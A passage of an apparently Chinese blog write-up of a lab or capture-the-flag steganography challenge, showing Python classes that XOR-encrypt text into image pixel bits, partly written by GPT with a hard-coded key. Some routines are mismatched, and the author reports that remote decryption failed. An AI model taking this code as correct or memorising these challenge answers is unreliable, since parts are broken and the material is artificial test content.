</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>key_length</span> <span class=o>==</span> <span class=mi>80</span><span class=p>:</span>  <span class=c1># Assuming a maximum key length of 10 characters (8 bits * 10 = 80 bits)</span>
</span></span><span class=line><span class=cl>                        <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>key_length</span> <span class=o>==</span> <span class=mi>80</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>key_length</span> <span class=o>==</span> <span class=mi>80</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>key_chars</span> <span class=o>=</span> <span class=p>[</span><span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>key_bin</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>],</span> <span class=mi>2</span><span class=p>))</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>key_bin</span><span class=p>),</span> <span class=mi>8</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>        <span class=n>key</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>key_chars</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>key</span>
</span></span></code></pre></td></tr></table></div></div><p>没有key可以，有了key不行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>class</span> <span class=nc>Solution</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>Encrypt</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>img</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>img_array</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>flat_img_array</span> <span class=o>=</span> <span class=n>img_array</span><span class=o>.</span><span class=n>flatten</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>data_binary</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>format</span><span class=p>(</span><span class=n>pixel</span><span class=p>,</span> <span class=s1>&#39;08b&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>pixel</span> <span class=ow>in</span> <span class=n>flat_img_array</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>key_binary</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>format</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>char</span><span class=p>),</span> <span class=s1>&#39;08b&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>key_binary</span><span class=p>)</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>data_binary</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>key_binary</span> <span class=o>+=</span> <span class=n>key_binary</span> <span class=o>*</span> <span class=p>((</span><span class=nb>len</span><span class=p>(</span><span class=n>data_binary</span><span class=p>)</span> <span class=o>//</span> <span class=nb>len</span><span class=p>(</span><span class=n>key_binary</span><span class=p>))</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>encrypted_data</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>data_bit</span><span class=p>,</span> <span class=n>key_bit</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>data_binary</span><span class=p>,</span> <span class=n>key_binary</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>encrypted_bit</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>data_bit</span><span class=p>)</span> <span class=o>^</span> <span class=nb>int</span><span class=p>(</span><span class=n>key_bit</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=n>encrypted_data</span> <span class=o>+=</span> <span class=n>encrypted_bit</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>encrypted_pixels</span> <span class=o>=</span> <span class=p>[</span><span class=nb>int</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>],</span> <span class=mi>2</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>),</span> <span class=mi>8</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypted_img_array</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>encrypted_pixels</span><span class=p>,</span> <span class=n>dtype</span><span class=o>=</span><span class=n>np</span><span class=o>.</span><span class=n>uint8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypted_img_array</span> <span class=o>=</span> <span class=n>encrypted_img_array</span><span class=o>.</span><span class=n>reshape</span><span class=p>(</span><span class=n>img_array</span><span class=o>.</span><span class=n>shape</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypted_img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>fromarray</span><span class=p>(</span><span class=n>encrypted_img_array</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>encrypted_img</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Solution</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>Decrypt</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>img</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>img_array</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>flat_img_array</span> <span class=o>=</span> <span class=n>img_array</span><span class=o>.</span><span class=n>flatten</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>key_binary</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>format</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>char</span><span class=p>),</span> <span class=s1>&#39;08b&#39;</span><span class=p>)</span> <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>extracted_data</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>pixel</span> <span class=ow>in</span> <span class=n>flat_img_array</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>pixel_binary</span> <span class=o>=</span> <span class=nb>format</span><span class=p>(</span><span class=n>pixel</span><span class=p>,</span> <span class=s1>&#39;08b&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>extracted_bit</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>pixel_binary</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span> <span class=o>^</span> <span class=nb>int</span><span class=p>(</span><span class=n>key_binary</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>            <span class=n>extracted_data</span> <span class=o>+=</span> <span class=n>extracted_bit</span>
</span></span><span class=line><span class=cl>            <span class=n>key_binary</span> <span class=o>=</span> <span class=n>key_binary</span><span class=p>[</span><span class=mi>1</span><span class=p>:]</span> <span class=o>+</span> <span class=n>extracted_bit</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>extracted_text</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>extracted_data</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=mi>8</span><span class=p>],</span> <span class=mi>2</span><span class=p>))</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>extracted_data</span><span class=p>),</span> <span class=mi>8</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>extracted_text</span>
</span></span></code></pre></td></tr></table></div></div><p>StegLab2-ToJPGAttack 本地测了没什么问题，能够加解密，服务器远程加密成功，解密寄了</p><p>GPT:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=n>抱歉</span><span class=err>，</span><span class=n>我之前的回复没有写完</span><span class=err>。</span><span class=n>下面是如何使用PIL</span><span class=err>、</span><span class=n>numpy和异或加密将文本信息加密到图像中</span><span class=err>，</span><span class=n>并从加密图像中解密文本信息的完整代码</span><span class=err>：</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>xor_crypt</span><span class=p>(</span><span class=n>data</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>key</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>))])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>encode_image</span><span class=p>(</span><span class=n>img</span><span class=p>,</span> <span class=n>msg</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypted_msg</span> <span class=o>=</span> <span class=n>xor_crypt</span><span class=p>(</span><span class=n>msg</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>encrypted_msg</span><span class=p>)</span> <span class=o>*</span> <span class=mi>8</span> <span class=o>&gt;</span> <span class=n>data</span><span class=o>.</span><span class=n>size</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;Message is too long to encode in image&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>bin_msg</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>format</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=s2>&#34;08b&#34;</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>encrypted_msg</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>flatten</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>bin_msg</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mi>1</span> <span class=o>|</span> <span class=nb>int</span><span class=p>(</span><span class=n>bin_msg</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>Image</span><span class=o>.</span><span class=n>fromarray</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>reshape</span><span class=p>(</span><span class=n>img</span><span class=o>.</span><span class=n>size</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>3</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decode_image</span><span class=p>(</span><span class=n>img</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>flatten</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>bin_msg</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>str</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>size</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>    <span class=n>encrypted_msg</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>bin_msg</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>bin_msg</span><span class=p>)</span> <span class=o>//</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;big&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>xor_crypt</span><span class=p>(</span><span class=n>encrypted_msg</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;mysecretpassword&#34;</span>
</span></span><span class=line><span class=cl><span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;image.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>encoded_img</span> <span class=o>=</span> <span class=n>encode_image</span><span class=p>(</span><span class=n>img</span><span class=p>,</span> <span class=s2>&#34;Hello, World!&#34;</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>encoded_img</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=s2>&#34;encoded_image.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;encoded_image.png&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>msg</span> <span class=o>=</span> <span class=n>decode_image</span><span class=p>(</span><span class=n>img</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Decoded message:&#34;</span><span class=p>,</span> <span class=n>msg</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>上面的代码定义了三个函数</span><span class=err>：</span><span class=n>xor_crypt</span><span class=err>、</span><span class=n>encode_image和decode_image</span><span class=err>。</span><span class=n>xor_crypt函数接受一个要加密</span><span class=o>/</span><span class=n>解密的数据和一个用于异或加密的密钥作为输入</span><span class=err>，</span><span class=n>并返回加密</span><span class=o>/</span><span class=n>解密后的数据</span><span class=err>。</span><span class=n>encode_image函数接受一个PIL图像对象</span><span class=err>、</span><span class=n>一个要加密的文本消息和一个用于异或加密的密钥作为输入</span><span class=err>，</span><span class=n>并返回一个加密后的PIL图像对象</span><span class=err>。</span><span class=n>decode_image函数接受一个加密的PIL图像对象和一个用于异或解密的密钥作为输入</span><span class=err>，</span><span class=n>并返回解密后的文本信息</span><span class=err>。</span>
</span></span><span class=line><span class=cl><span class=n>希望这些信息对您有所帮助</span><span class=err>！</span><span class=n>如果您有其他问题</span><span class=err>，</span><span class=n>请随时告诉我</span><span class=err>。😊</span>
</span></span></code></pre></td></tr></table></div></div><p>加密：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>class</span> <span class=nc>Solution</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>xor_crypt</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>key</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>))])</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>Encrypt</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>img</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># img, msg, key</span>
</span></span><span class=line><span class=cl>        <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>msg</span> <span class=o>=</span> <span class=n>key</span>
</span></span><span class=line><span class=cl>        <span class=n>key</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;mysecretpassword&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>encrypted_msg</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>xor_crypt</span><span class=p>(</span><span class=n>msg</span><span class=o>.</span><span class=n>encode</span><span class=p>(),</span> <span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>encrypted_msg</span><span class=p>)</span> <span class=o>*</span> <span class=mi>8</span> <span class=o>&gt;</span> <span class=n>data</span><span class=o>.</span><span class=n>size</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>raise</span> <span class=ne>ValueError</span><span class=p>(</span><span class=s2>&#34;Message is too long to encode in image&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>bin_msg</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>format</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=s2>&#34;08b&#34;</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>encrypted_msg</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>flatten</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>bin_msg</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;</span> <span class=o>~</span><span class=mi>1</span> <span class=o>|</span> <span class=nb>int</span><span class=p>(</span><span class=n>bin_msg</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>Image</span><span class=o>.</span><span class=n>fromarray</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>reshape</span><span class=p>(</span><span class=n>img</span><span class=o>.</span><span class=n>size</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=n>img</span><span class=o>.</span><span class=n>size</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span> <span class=mi>3</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>解密：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=k>class</span> <span class=nc>Solution</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>xor_crypt</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>data</span><span class=p>,</span> <span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>key</span><span class=p>[</span><span class=n>i</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>key</span><span class=p>)]</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>data</span><span class=p>))])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>Decrypt</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span><span class=n>img</span><span class=p>)</span><span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># def decode_image(img, key):</span>
</span></span><span class=line><span class=cl>        <span class=n>key</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;mysecretpassword&#34;</span>
</span></span><span class=line><span class=cl>        <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=n>data</span><span class=o>.</span><span class=n>flatten</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>bin_msg</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>([</span><span class=nb>str</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&amp;</span> <span class=mi>1</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>data</span><span class=o>.</span><span class=n>size</span><span class=p>)])</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypted_msg</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>bin_msg</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>bin_msg</span><span class=p>)</span> <span class=o>//</span> <span class=mi>8</span><span class=p>,</span> <span class=s1>&#39;big&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>d</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>xor_crypt</span><span class=p>(</span><span class=n>encrypted_msg</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(d[:20])</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>d</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
